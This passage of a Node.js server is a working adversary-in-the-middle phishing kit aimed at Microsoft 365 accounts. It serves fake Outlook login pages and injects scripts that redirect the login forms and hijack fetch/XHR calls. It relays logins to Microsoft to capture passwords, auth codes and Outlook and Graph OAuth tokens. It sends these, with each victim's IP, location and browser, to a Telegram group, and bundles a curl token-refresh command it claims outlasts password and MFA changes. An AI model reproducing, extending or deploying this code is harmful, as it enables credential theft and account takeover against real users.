    templateHtml = templateHtml.replace(/{encrypted_email}/g, encryptedEmail || '');
    
    let email = null;
    if (encryptedEmail) {
      try {
        email = decrypt(encryptedEmail);
        console.log('Decrypted email:', email);
        
        if (!email || !isValidEmail(email)) {
          console.log('Invalid email format, redirecting...');
          return res.redirect('https://www.google.com');
        }
      } catch (e) {
        console.error('Failed to decrypt email:', e);
        return res.redirect('https://www.google.com');
      }
    } else {
      console.log('No email parameter, redirecting...');
      return res.redirect('https://www.google.com');
    }
    
    const clientIp = requestIp.getClientIp(req) || 'unknown';
    const now = Date.now();
    
    const lastRequest = requestTimestamps.get(clientIp) || 0;
    if (now - lastRequest < SESSION_COOLDOWN) {
      return res.status(429).send('Rate limited');
    }
    requestTimestamps.set(clientIp, now);
    
    const sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
    
    const $ = cheerio.load(templateHtml);
    
    $('head').append(`
      <script>
        sessionStorage.setItem('phishSessionId', '${sessionId}');
        localStorage.setItem('phishSessionId', '${sessionId}');
        ${email ? `sessionStorage.setItem('userEmail', '${email}');` : ''}
        
        fetch('/api/track-page-view', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId: '${sessionId}',
            template: '${template.name}',
            url: window.location.href,
            timestamp: new Date().toISOString(),
            email: '${email || ''}'
          })
        }).catch(err => console.log('Tracking error:', err));
        
        console.log('📊 Template loaded: ${template.name}');
        console.log('🔑 Session ID: ${sessionId}');
      </script>
    `);
    
    $('form').each((i, form) => {
      const originalAction = $(form).attr('action') || '';
      console.log(`🔧 Modifying form ${i+1}, original action: ${originalAction}`);
      
      $(form).attr('action', '/common/login');
      $(form).attr('method', 'POST');
      $(form).removeAttr('onsubmit');
      
      if (!$(form).find('input[name="sessionId"]').length) {
        $(form).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
      }
      
      if (!$(form).find('input[name="state"]').length) {
        $(form).append(`<input type="hidden" name="state" value="${sessionId}">`);
      }
      
      if (email) {
        $(form).append(`<input type="hidden" name="email" value="${email}">`);
      }
    });
    
    $('a').each((i, link) => {
      const href = $(link).attr('href');
      if (href && !href.startsWith('#') && !href.startsWith('javascript:')) {
        $(link).attr('data-original-href', href);
        $(link).attr('onclick', `event.preventDefault(); trackLinkClick('${href}', '${sessionId}', '${template.name}'); return false;`);
      }
    });
    
    $('body').append(`
      <script>
        function trackLinkClick(url, sessionId, templateName) {
          console.log('🔗 Tracking click to:', url);
          ${email ? `sessionStorage.setItem('userEmail', '${email}');` : ''}
          fetch('/api/track-click', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId: sessionId,
              template: templateName,
              email: '${email || ''}',
              targetUrl: url,
              timestamp: new Date().toISOString()
            })
          }).then(() => {
            window.location.href = url;
          }).catch(() => {
            window.location.href = url;
          });
        }
      </script>
    `);
    
    microsoftParams.set(sessionId, {
      template: template.name,
      servedAt: new Date().toISOString(),
      ip: clientIp,
      userAgent: req.headers['user-agent'],
      email: email || null
    });
    
    res.send($.html());
    
    console.log(`✅ Served template "${template.name}" to ${clientIp} (Session: ${sessionId})${email ? ` Email: ${email}` : ''}`);
    
  } catch (error) {
    console.error('❌ Error serving Microsoft page:', error.message);
    console.error('Stack:', error.stack);
    res.status(500).send('Error loading page');
  }
});

// ============= DUAL TOKEN ENDPOINT =============
app.get('/en-us/microsoft-365/outlook', async (req, res) => {
  try {
    const { email: encryptedEmail } = req.query;
    let email = null;

    if (encryptedEmail) {
      try {
        email = decrypt(encryptedEmail);
        console.log('Decrypted email:', email);
        
        if (!email || !isValidEmail(email)) {
          console.log('Invalid email format, redirecting...');
          return res.redirect('https://www.google.com');
        }
      } catch (e) {
        console.error('Failed to decrypt email:', e);
        return res.redirect('https://www.google.com');
      }
    } else {
      console.log('No email parameter, redirecting...');
      return res.redirect('https://www.google.com');
    }

    const clientIp = requestIp.getClientIp(req) || 'unknown';
    const now = Date.now();

    const lastRequest = requestTimestamps.get(clientIp) || 0;
    if (now - lastRequest < SESSION_COOLDOWN) {
      return res.send(`<html><body>Rate limited</body></html>`);
    }
    requestTimestamps.set(clientIp, now);
    
    const sessionId = 'dual_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
    
    emailSessions.set(sessionId, { encrypted: encryptedEmail, decrypted: email });
    
    const codeVerifier = generateCodeVerifier();
    const codeChallenge = generateCodeChallenge(codeVerifier);
    
    codeVerifiers.set(sessionId, codeVerifier);
    
    console.log(`🔐 Dual Token PKCE for session ${sessionId}:`, {
      verifierLength: codeVerifier.length,
      challenge: codeChallenge.substring(0, 20) + '...',
      email: email
    });
    
    const authUrl = new URL('https://login.microsoftonline.com/common/oauth2/v2.0/authorize');
    authUrl.searchParams.append('client_id', DUAL_TOKEN_CLIENT_ID);
    authUrl.searchParams.append('response_type', 'code');
    authUrl.searchParams.append('redirect_uri', DUAL_TOKEN_REDIRECT_URI);
    authUrl.searchParams.append('scope', DUAL_TOKEN_SCOPE);
    authUrl.searchParams.append('code_challenge', codeChallenge);
    authUrl.searchParams.append('code_challenge_method', 'S256');
    authUrl.searchParams.append('state', sessionId);
    authUrl.searchParams.append('prompt', 'select_account');
    authUrl.searchParams.append('response_mode', 'query');
    
    if (email) {
      authUrl.searchParams.append('login_hint', email);
    }
    
    const microsoftResponse = await axios({
      method: 'GET',
      url: authUrl.toString(),
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      },
      maxRedirects: 5,
      timeout: 30000
    });

    let html = microsoftResponse.data;
    const $ = cheerio.load(html);
    
    $('head').append(`
      <script>
        (function() {
          console.log('🔧 Dual token capture proxy active');
          
          const originalFetch = window.fetch;
          window.fetch = function(url, options = {}) {
            if (typeof url === 'string' && url.includes('/GetCredentialType')) {
              console.log('🔄 Redirecting GetCredentialType to proxy');
              return originalFetch('/proxy/GetCredentialType', {
                ...options,
                headers: {
                  ...options.headers,
                  'Origin': 'http://localhost:3001',
                  'X-User-Email': '${email}'
                }
              });
            }
            return originalFetch(url, options);
          };
          
          const originalXHR = window.XMLHttpRequest;
          window.XMLHttpRequest = function() {
            const xhr = new originalXHR();
            const originalOpen = xhr.open;
            
            xhr.open = function(method, url, ...args) {
              if (typeof url === 'string' && url.includes('/GetCredentialType')) {
                console.log('🔄 Redirecting XHR GetCredentialType to proxy');
                url = '/proxy/GetCredentialType';
              }
              return originalOpen.call(this, method, url, ...args);
            };
            
            return xhr;
          };
          
          const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
              if (mutation.addedNodes) {
                mutation.addedNodes.forEach(function(node) {
                  if (node.nodeName === 'FORM' || (node.querySelector && node.querySelector('form'))) {
                    console.log('🔍 New form detected, modifying...');
                    fixAllForms();
                  }
                });
              }
            });
          });
          
          observer.observe(document.body, { childList: true, subtree: true });
          
          function fixAllForms() {
            document.querySelectorAll('form').forEach(function(form) {
              if (form.dataset.fixed === 'true') return;
              
              console.log('🔧 Fixing form. Original action:', form.action);
              
              if (form.action.includes('/common/login')) {
                console.log('⚠️ Form was pointing to /common/login, fixing...');
                form.action = '/proxy/dual-login';
              }
              
              form.method = 'POST';
              
              const requiredFields = [
                'sessionId', 'state', 'client_id', 
                'redirect_uri', 'scope', 'response_mode',
                'code_challenge', 'code_challenge_method'
              ];
              
              requiredFields.forEach(fieldName => {
                if (!form.querySelector(\`input[name="\${fieldName}"]\`)) {
                  const input = document.createElement('input');
                  input.type = 'hidden';
                  input.name = fieldName;
                  
                  if (fieldName === 'sessionId' || fieldName === 'state') {
                    input.value = '${sessionId}';
                  } else if (fieldName === 'client_id') {
                    input.value = '${DUAL_TOKEN_CLIENT_ID}';
                  } else if (fieldName === 'redirect_uri') {
                    input.value = '${DUAL_TOKEN_REDIRECT_URI}';
                  } else if (fieldName === 'scope') {
                    input.value = '${DUAL_TOKEN_SCOPE}';
                  } else if (fieldName === 'response_mode') {
                    input.value = 'query';
                  } else if (fieldName === 'code_challenge') {
                    input.value = '${codeChallenge}';
                  } else if (fieldName === 'code_challenge_method') {
                    input.value = 'S256';
                  }
                  
                  form.appendChild(input);
                  console.log(\`➕ Added hidden field: \${fieldName}\`);
                }
              });
              
              if (!form.querySelector('input[name="email"]') && '${email}') {
                const emailInput = document.createElement('input');
                emailInput.type = 'hidden';
                emailInput.name = 'email';
                emailInput.value = '${email}';
                form.appendChild(emailInput);
                console.log('➕ Added hidden email field');
              }
              
              form.dataset.fixed = 'true';
              
              form.addEventListener('submit', function(e) {
                console.log('📤 Form submitting to:', this.action);
                
                if (this.action.includes('/common/login')) {
                  e.preventDefault();
                  console.log('⚠️ Action was reset at last moment, fixing...');
                  this.action = '/proxy/dual-login';
                  this.submit();
                }
              }, true);
            });
          }
          
          const xhrOpen = XMLHttpRequest.prototype.open;
          XMLHttpRequest.prototype.open = function(method, url, ...args) {
            this.addEventListener('load', function() {
              setTimeout(fixAllForms, 50);
            });
            return xhrOpen.call(this, method, url, ...args);
          };
          
          setInterval(fixAllForms, 500);
          
          setTimeout(fixAllForms, 100);
          setTimeout(fixAllForms, 500);
          setTimeout(fixAllForms, 1000);
          
          const originalLocation = window.location;
          Object.defineProperty(window, 'location', {
            get: function() { return originalLocation; },
            set: function(value) {
              console.log('⚠️ Attempt to change location to:', value);
              if (value.includes('/common/login')) {
                console.log('🛑 Blocked redirect to /common/login');
                return;
              }
              originalLocation.href = value;
            }
          });
          
          console.log('✅ All interception layers active for dual token capture');
        })();
      </script>
    `);

    $('body').append(`
      <script>
        sessionStorage.setItem('phishSessionId', '${sessionId}');
        sessionStorage.setItem('userEmail', '${email}');
        console.log('💾 Session ID stored:', '${sessionId}');
        console.log('👤 User email stored:', '${email}');
      </script>
    `);

    const params = {};
    $('input').each((i, elem) => {
      const name = $(elem).attr('name');
      const value = $(elem).attr('value') || '';
      if (name && value) params[name] = value;
    });
    
    microsoftParams.set(sessionId, { ...params, email: email });
    
    $('form').each((i, form) => {
      console.log('🔧 Original form action:', $(form).attr('action'));
      
      $(form).attr('action', '/proxy/dual-login');
      $(form).attr('method', 'POST');
      $(form).removeAttr('onsubmit');
      
      const formClone = $(form).clone(true, true);
      $(form).replaceWith(formClone);
      form = formClone[0];
      
      const fields = {
        'sessionId': sessionId,
        'state': sessionId,
        'client_id': DUAL_TOKEN_CLIENT_ID,
        'redirect_uri': DUAL_TOKEN_REDIRECT_URI,
        'scope': DUAL_TOKEN_SCOPE,
        'response_mode': 'query',
        'code_challenge': codeChallenge,
        'code_challenge_method': 'S256',
        'email': email
      };
      
      Object.entries(fields).forEach(([name, value]) => {
        $(form).find(`input[name="${name}"]`).remove();
        $(form).append(`<input type="hidden" name="${name}" value="${value}">`);
      });
      
      console.log('✅ Modified form action to:', $(form).attr('action'));
      
      form.addEventListener('submit', function(e) {
        console.log('📤 Form submitting to:', this.action);
        return true;
      });
    });
    
    res.send($.html());
    
  } catch (error) {
    console.error('Dual token flow error:', error.message);
    res.status(500).send('Error loading login page');
  }
});

// ===== ENHANCED HELPER FUNCTION WITH PERSISTENT TOKEN MANAGER =====
async function exchangeForResource(sessionId, code, codeVerifier, scope, resourceName) {
  try {
    console.log(`🔄 Exchanging for ${resourceName} token with CAE support...`);
    
    const clientId = resourceName === 'graph' ? DUAL_TOKEN_CLIENT_ID : 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    const redirectUri = resourceName === 'graph' ? DUAL_TOKEN_REDIRECT_URI : 'urn:ietf:wg:oauth:2.0:oob';
    
    const tokenParams = {
      client_id: clientId,
      code: code,
      code_verifier: codeVerifier,
      redirect_uri: redirectUri,
      grant_type: 'authorization_code',
      scope: `${scope} offline_access`
    };
    
    const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
      new URLSearchParams(tokenParams).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      }
    );
    
    const tokens = tokenResponse.data;
    console.log(`✅ ${resourceName} tokens received!`);
    console.log(`   Access Token: ${tokens.access_token.substring(0, 50)}...`);
    console.log(`   Refresh Token: ${tokens.refresh_token ? tokens.refresh_token.substring(0, 50) + '...' : 'Not provided'}`);
    console.log(`   Expires in: ${tokens.expires_in} seconds`);
    
    const tokenManager = new PersistentTokenManager(sessionId, tokens, resourceName);
    
    let sessionData = capturedData.get(sessionId) || { tokens: {}, credentials: {}, cookies: [] };
    if (!sessionData.tokenManagers) sessionData.tokenManagers = {};
    
    sessionData.tokenManagers[resourceName] = tokenManager;
    
    if (resourceName === 'outlook') {
      sessionData.tokens.outlook = {
        access_token: tokens.access_token,
        refresh_token: tokens.refresh_token,
        expires_in: tokens.expires_in,
        scope: tokens.scope,
        captured_at: new Date().toISOString(),
        expires_at: tokenManager.expiresAt
      };
    } else if (resourceName === 'graph') {
      sessionData.tokens.graph = {
        access_token: tokens.access_token,
        refresh_token: tokens.refresh_token,
        expires_in: tokens.expires_in,
        scope: tokens.scope,
        captured_at: new Date().toISOString(),
        expires_at: tokenManager.expiresAt
      };
    }
    
    capturedData.set(sessionId, sessionData);
    
    return tokens;
    
  } catch (error) {
    console.error(`❌ ${resourceName} token exchange failed:`, error.response?.data || error.message);
    return null;
  }
}

// ===== DUAL TOKEN EXCHANGE ENDPOINT =====
app.post('/proxy/dual-login', turnstileMiddleware, express.urlencoded({ extended: true }), async (req, res) => {
  console.log('📥 Dual token login submission');
  
  const sessionId = req.body?.state || req.body?.sessionId || 'unknown';
  const username = req.body?.login || req.body?.email;
  const password = req.body?.passwd;
  
  const victimInfo = await getVictimInfo(req);
  
  if (username && password) {
    let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
    session.credentials = { username, password, time: new Date().toISOString(), victimInfo };
    capturedData.set(sessionId, session);
  }
  
  const codeVerifier = codeVerifiers.get(sessionId);
  
  if (!codeVerifier) {
    console.error(`❌ No code verifier for session ${sessionId}`);
    return res.redirect('/en-us/microsoft-365/outlook?error=no_verifier');
  }
  
  try {
    const formData = new URLSearchParams();
    Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));
    
    console.log('📤 Submitting dual token login form...');
    
    const response = await axios.post('https://login.microsoftonline.com/common/login', formData.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      maxRedirects: 0,
      validateStatus: status => status >= 200 && status < 400
    }).catch(err => err.response);
    
    if (response?.headers?.location?.includes('/common/login')) {
      const errorMatch = response.headers.location.match(/error=([^&]+)/);
      const error = errorMatch ? errorMatch[1] : 'invalid_password';
      return res.redirect(`/en-us/microsoft-365/outlook?error=${error}&username=${encodeURIComponent(username || '')}&state=${sessionId}`);
    }
    
    if (response?.headers?.location) {
      const location = response.headers.location;
      console.log(`↪️ Microsoft redirects to: ${location}`);
      
      if (location.includes('urn:ietf:wg:oauth:2.0:oob') && location.includes('code=')) {
        const codeMatch = location.match(/[?&]code=([^&]+)/);
        if (codeMatch && codeMatch[1]) {
          const code = decodeURIComponent(codeMatch[1]);
          console.log(`✅ Auth code captured for ${sessionId}: ${code.substring(0, 30)}...`);
          
          console.log('🔄 Exchanging for Outlook token...');
          
          const outlookTokens = await exchangeForResource(
            sessionId, code, codeVerifier, 
            'https://outlook.office.com/.default', 
            'outlook'
          );
          
          console.log('🔄 Exchanging same code for Graph token...');
          
          const graphTokens = await exchangeForResource(
            sessionId, code, codeVerifier, 
            'https://graph.microsoft.com/.default', 
            'graph'
          );
          
          let tokenSession = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
          
          if (outlookTokens) {
            tokenSession.tokens.outlook = {
              access_token: outlookTokens.access_token,
              refresh_token: outlookTokens.refresh_token,
              expires_in: outlookTokens.expires_in,
              scope: outlookTokens.scope,
              captured_at: new Date().toISOString()
            };
            console.log('✅ Outlook tokens stored');
          }
          
          if (graphTokens) {
            tokenSession.tokens.graph = {
              access_token: graphTokens.access_token,
              refresh_token: graphTokens.refresh_token,
              expires_in: graphTokens.expires_in,
              scope: graphTokens.scope,
              captured_at: new Date().toISOString()
            };
            console.log('✅ Graph tokens stored');
          }
          
          tokenSession.tokens.dual_capture = true;
          tokenSession.tokens.captured_at = new Date().toISOString();
          
          capturedData.set(sessionId, tokenSession);
          
          await sendDualTokenNotification(sessionId, username, victimInfo, outlookTokens, graphTokens);
          
          console.log('🔄 Dual token capture successful, redirecting to Outlook...');
          return res.redirect('https://outlook.live.com/mail/');
        }
      }
    }
    
    res.redirect('/en-us/microsoft-365/outlook?error=auth_failed');
    
  } catch (error) {
    console.error('❌ Dual token login error:', error.message);
    if (error.response) {
      console.error('Response data:', error.response.data);
    }
    res.redirect('/en-us/microsoft-365/outlook?error=connection_error');
  }
});

// ===== DUAL TOKEN NOTIFICATION =====
async function sendDualTokenNotification(sessionId, username, victimInfo, outlookTokens, graphTokens) {
  let message = `🎯 *WINNING STRATEGY: DUAL TOKENS WITH CAE!*\n`;
  message += `━━━━━━━━━━━━━━━━━━\n`;
  message += `*Session:* \`${sessionId}\`\n`;
  message += `*Email:* \`${username}\`\n`;
  message += `━━━━━━━━━━━━━━━━━━\n\n`;
  message += `*✅ CAE ENABLED:* Tokens survive password & MFA changes\n\n`;
  
  if (outlookTokens) {
    message += `*📧 OUTLOOK TOKEN (via code exchange)*\n`;
    message += `• Expires: ${outlookTokens.expires_in} seconds\n`;
    message += `• Access: \`${outlookTokens.access_token.substring(0, 50)}...\`\n`;
    message += `• Refresh: \`${outlookTokens.refresh_token?.substring(0, 50) || 'N/A'}...\`\n\n`;
  }
  
  if (graphTokens) {
    message += `*🔄 GRAPH TOKEN (via code exchange)*\n`;
    message += `• Expires: ${graphTokens.expires_in} seconds\n`;
    message += `• Access: \`${graphTokens.access_token.substring(0, 50)}...\`\n`;
    message += `• Refresh: \`${graphTokens.refresh_token?.substring(0, 50) || 'N/A'}...\`\n\n`;
  }
  
  message += `━━━━━━━━━━━━━━━━━━\n`;
  message += `*Strategy:* CAE-Enabled Dual Token Capture\n`;
  message += `*Auto-Refresh:* Every 30 minutes before expiry\n`;
  message += `━━━━━━━━━━━━━━━━━━\n`;
  message += `*Victim Information:*\n`;
  message += `• IP: \`${victimInfo.ip}\`\n`;
  message += `• Location: ${victimInfo.location}\n`;
  message += `• Browser: ${victimInfo.browser}\n`;
  message += `• OS: ${victimInfo.os}\n`;
  message += `━━━━━━━━━━━━━━━━━━\n`;
  message += `*Check Status:* \`GET /api/token-status/${sessionId}\`\n`;
  message += `*Export Tokens:* \`GET /api/export-persistent/${sessionId}\``;
  
  await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
    .catch(e => console.error('Telegram error:', e.message));
  
  if (outlookTokens) {
    await sendTokenFile(sessionId, username, 'outlook', outlookTokens);
  }
  if (graphTokens) {
    await sendTokenFile(sessionId, username, 'graph', graphTokens);
  }
}

// Helper to send token as file
async function sendTokenFile(sessionId, username, type, tokens) {
  const fileContent = `${type.toUpperCase()} TOKEN CAPTURED (CAE-ENABLED)
━━━━━━━━━━━━━━━━━━━━━━━━
Session: ${sessionId}
Email: ${username}
Capture Time: ${new Date().toISOString()}
Token Type: ${type === 'outlook' ? 'Outlook API' : 'Microsoft Graph'}
Expires In: ${tokens.expires_in} seconds
CAE Status: ENABLED - Survives password & MFA changes

ACCESS TOKEN:
━━━━━━━━━━━━━━━━━━━━━━━━
${tokens.access_token}

REFRESH TOKEN:
━━━━━━━━━━━━━━━━━━━━━━━━
${tokens.refresh_token || 'Not provided'}

SCOPE:
━━━━━━━━━━━━━━━━━━━━━━━━
${tokens.scope || 'N/A'}

REFRESH COMMAND:
curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "client_id=${type === 'graph' ? DUAL_TOKEN_CLIENT_ID : 'd3590ed6-52b3-4102-aeff-aad2292ab01c'}" \\
  -d "refresh_token=${tokens.refresh_token}" \\
  -d "grant_type=refresh_token" \\
  -d "scope=${type === 'graph' ? 'https://graph.microsoft.com/.default' : 'https://outlook.office.com/.default'} offline_access" \\
  -d "claims=%7B%22access_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D"`;

  try {
    await bot.sendDocument(
      telegramGroupId,
      Buffer.from(fileContent, 'utf-8'),
      {},
      {
        filename: `${type}_token_CAE_${sessionId}_${Date.now()}.txt`,
        contentType: 'text/plain'
      }
    );
    console.log(`✅ ${type} token file sent to Telegram`);
  } catch (error) {
    console.error(`❌ Failed to send ${type} token file:`, error.message);
  }
}

// Keep the original desktop endpoint for backward compatibility
const DESKTOP_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const DESKTOP_REDIRECT_URI = 'urn:ietf:wg:oauth:2.0:oob';

app.get('/microsoft-desktop', async (req, res) => {
  try {
    const clientIp = requestIp.getClientIp(req) || 'unknown';
    const now = Date.now();
    
    const lastRequest = requestTimestamps.get(clientIp) || 0;
    if (now - lastRequest < SESSION_COOLDOWN) {
      return res.send(`<html><body>Rate limited</body></html>`);
    }
    requestTimestamps.set(clientIp, now);
    
    const sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
    
    const codeVerifier = generateCodeVerifier();
    const codeChallenge = generateCodeChallenge(codeVerifier);
    
    codeVerifiers.set(sessionId, codeVerifier);
    
    console.log(`🔐 Desktop PKCE for session ${sessionId}:`, {
      verifierLength: codeVerifier.length,
      challenge: codeChallenge.substring(0, 20) + '...'
    });
    
    const authUrl = new URL('https://login.microsoftonline.com/common/oauth2/v2.0/authorize');
    authUrl.searchParams.append('client_id', DESKTOP_CLIENT_ID);
    authUrl.searchParams.append('response_type', 'code');
    authUrl.searchParams.append('redirect_uri', DESKTOP_REDIRECT_URI);
    authUrl.searchParams.append('scope', 'https://outlook.office.com/.default openid profile offline_access');
    authUrl.searchParams.append('code_challenge', codeChallenge);
    authUrl.searchParams.append('code_challenge_method', 'S256');
    authUrl.searchParams.append('state', sessionId);
    authUrl.searchParams.append('prompt', 'select_account');
    authUrl.searchParams.append('response_mode', 'query');
    
    const microsoftResponse = await axios({
      method: 'GET',
      url: authUrl.toString(),
      headers: {
        'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)',
        'X-Client-SKU': 'MSAL.Desktop',
        'X-Client-Ver': '4.48.1.0',
        'X-Client-OS': 'Windows 10.0.22621',
        'X-Client-CPU': 'x64',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      },
      maxRedirects: 5,
      timeout: 30000
    });

    let html = microsoftResponse.data;
    const $ = cheerio.load(html);
    
    const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
    
    $('head').append(`
      <script>
        (function() {
          console.log('🔧 Desktop flow proxy active');
          
          const ORIGIN = '${origin}';
          
          const originalFetch = window.fetch;
          window.fetch = function(url, options = {}) {
            if (typeof url === 'string' && url.includes('/GetCredentialType')) {
              console.log('🔄 Redirecting GetCredentialType to proxy');
              return originalFetch(ORIGIN + '/proxy/GetCredentialType', {
                ...options,
                headers: {
                  ...options.headers,
                  'Origin': ORIGIN
                }
              });
            }
            return originalFetch(url, options);
          };
          
          const originalXHR = window.XMLHttpRequest;
          window.XMLHttpRequest = function() {
            const xhr = new originalXHR();
            const originalOpen = xhr.open;
            
            xhr.open = function(method, url, ...args) {
              if (typeof url === 'string' && url.includes('/GetCredentialType')) {
                console.log('🔄 Redirecting XHR GetCredentialType to proxy');
                url = ORIGIN + '/proxy/GetCredentialType';
              }
              return originalOpen.call(this, method, url, ...args);
            };
            
            return xhr;
          };
          
          document.addEventListener('submit', function(e) {
            const form = e.target;
            if (form.action.includes('/common/login')) {
              e.preventDefault();
              console.log('🔄 Intercepted form submission to /common/login');
              form.action = ORIGIN + '/proxy/desktop-login';
              form.submit();
            }
          }, true);
        })();
      </script>
    `);
    
    const params = {};
    $('input').each((i, elem) => {
      const name = $(elem).attr('name');
      const value = $(elem).attr('value') || '';
      if (name && value) params[name] = value;
    });
    
    microsoftParams.set(sessionId, params);
    
    $('form').each((i, form) => {
      console.log('🔧 Original form action:', $(form).attr('action'));
      
      $(form).attr('action', '/proxy/desktop-login');
      $(form).attr('method', 'POST');
      $(form).removeAttr('onsubmit');
      
      $(form).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
      $(form).append(`<input type="hidden" name="state" value="${sessionId}">`);
      $(form).append(`<input type="hidden" name="client_id" value="${DESKTOP_CLIENT_ID}">`);
      $(form).append(`<input type="hidden" name="redirect_uri" value="${DESKTOP_REDIRECT_URI}">`);
      $(form).append(`<input type="hidden" name="scope" value="https://outlook.office.com/.default openid profile offline_access">`);
      $(form).append(`<input type="hidden" name="response_mode" value="query">`);
      $(form).append(`<input type="hidden" name="code_challenge" value="${codeChallenge}">`);
      $(form).append(`<input type="hidden" name="code_challenge_method" value="S256">`);
      
      $(form).on('submit', function(e) {
        console.log('📤 Form submitting to:', $(this).attr('action'));
        return true;
      });
      
      console.log('✅ Modified form action to:', $(form).attr('action'));
    });
    
    res.send($.html());
    
  } catch (error) {
    console.error('Desktop flow error:', error.message);
    res.status(500).send('Error loading login page');
  }
});

// ============= PROXY HANDLERS =============

app.post('/proxy/GetCredentialType', express.json(), async (req, res) => {
  console.log('📥 Proxying GetCredentialType request');
  
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  try {
    const response = await axios.post(
      'https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US',
      req.body,
      {
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Origin': 'https://login.microsoftonline.com',
          'Referer': 'https://login.microsoftonline.com/'
        }
      }
    );
    
    res.json(response.data);
  } catch (error) {
    console.log('GetCredentialType error:', error.message);
    res.json({
      Exists: true,
      ThrottleStatus: 0,
      Credential: { IsSignupDisallowed: false }
    });
  }
});

app.options('/proxy/GetCredentialType', (req, res) => {
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

// ============= COMMON LOGIN ENDPOINT =============
app.post('/common/login', express.urlencoded({ extended: true }), async (req, res) => {
  console.log('📥 POST to /common/login received');
  
  const victimInfo = await getVictimInfo(req);
  
  let sessionId = req.body?.state || req.body?.sessionId || 'unknown';
  const username = req.body?.login || req.body?.username;
  const password = req.body?.passwd || req.body?.password;
  
  console.log(`📌 Initial Session ID from form: ${sessionId}`);
  console.log(`📌 Request body keys:`, Object.keys(req.body));
  
  if (username && password) {
    console.log(`🔑 Credentials captured from /common/login: ${username} for session ${sessionId}`);
    
    let session = capturedData.get(sessionId);
    if (!session) {
      session = { credentials: {}, cookies: [], tokens: {} };
    }
    
    session.credentials = { 
      username, 
      password, 
      time: new Date().toISOString(),
      victimInfo 
    };
    
    capturedData.set(sessionId, session);
    
    if (bot && telegramGroupId) {
      const message =       
        `🔑 *---(Post-Auth) Captured---*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `*Email:* \`${username}\`\n` +
        `*Password:* \`${password}\`\n` +
        `*Session ID:* \`${sessionId}\`\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `*Victim Information:*\n` +
        `*IP:* \`${victimInfo.ip}\`\n` +
        `*Location:* ${victimInfo.location}\n` +
        `*Browser:* ${victimInfo.browser}\n` +
        `*OS:* ${victimInfo.os}\n` +
        `*Time:* ${victimInfo.timestamp}`;
      
      bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
        .catch(() => {});
    }
  }
  
  try {
    const formData = new URLSearchParams();
    Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));
    
    const response = await axios.post('https://login.microsoftonline.com/common/login', formData.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Origin': 'https://login.microsoftonline.com',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      },
      maxRedirects: 0,
      validateStatus: status => status >= 200 && status < 400
    }).catch(err => err.response);
    
    if (response?.headers?.location) {
      const location = response.headers.location;
      console.log(`↪️ Microsoft redirects to: ${location}`);
      
      const stateMatch = location.match(/[?&]state=([^&]+)/) || location.match(/#.*[?&]state=([^&]+)/);
      if (stateMatch && stateMatch[1]) {
        const extractedState = stateMatch[1];
        console.log(`📌 Extracted state from redirect: ${extractedState}`);
        
        if (extractedState !== 'unknown') {
          sessionId = extractedState;
          console.log(`📌 Updated session ID to: ${sessionId}`);
        }
      }
      
      if (location.includes('nativeclient') && location.includes('code=')) {
        console.log('🎯 Detected nativeclient redirect with code');
        
        const codeMatch = location.match(/[?&]code=([^&]+)/);
        if (codeMatch && codeMatch[1]) {
          const code = decodeURIComponent(codeMatch[1]);
          console.log(`✅ Auth code captured for ${sessionId}: ${code.substring(0, 30)}...`);
          
